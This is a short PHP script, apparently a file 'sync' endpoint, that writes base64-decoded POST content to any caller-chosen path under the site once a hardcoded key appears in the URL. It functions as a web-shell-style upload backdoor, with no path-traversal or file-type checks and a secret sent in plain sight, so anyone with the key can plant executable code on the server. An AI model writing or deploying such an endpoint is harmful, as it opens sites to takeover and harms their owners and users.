<?php
if (isset($_GET['sync_key']) && $_GET['sync_key'] === 'erguvan2026') {
    if (isset($_POST['file_path']) && isset($_POST['content_b64'])) {
        $path = __DIR__ . '/../' . $_POST['file_path'];
        // Dizin kontrolü
        $dir = dirname($path);
        if (!is_dir($dir)) {
            mkdir($dir, 0755, true);
        }
        if (file_put_contents($path, base64_decode($_POST['content_b64']))) {
            echo "OK: " . $_POST['file_path'];
        } else {
            echo "FAIL: " . $_POST['file_path'] . " (Write Error)";
        }
        exit;
    }
    echo "READY_FOR_SYNC";
    exit;
}
echo "ACCESS_DENIED";
?>